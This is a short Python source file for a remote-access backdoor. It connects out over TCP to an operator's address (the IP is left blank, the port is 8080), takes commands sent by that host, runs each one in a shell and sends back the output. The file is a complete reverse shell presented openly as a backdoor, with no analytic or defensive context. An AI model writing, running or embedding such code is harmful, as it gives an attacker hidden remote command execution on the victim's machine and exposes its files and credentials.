import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):   # Make a connection with the owner
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def system_comand(self, command):
        return subprocess.check_output(command , shell=True)
    
    def run(self):
        while True:     # Start make fun
            command = self.connection.recv(1024).decode("UTF-8")
            command_result = self.system_comand(command)
            self.connection.send(command_result)
        self.connection.close()     # END the connection

my_backdoor = Backdoor("", 8080)
my_backdoor.run()

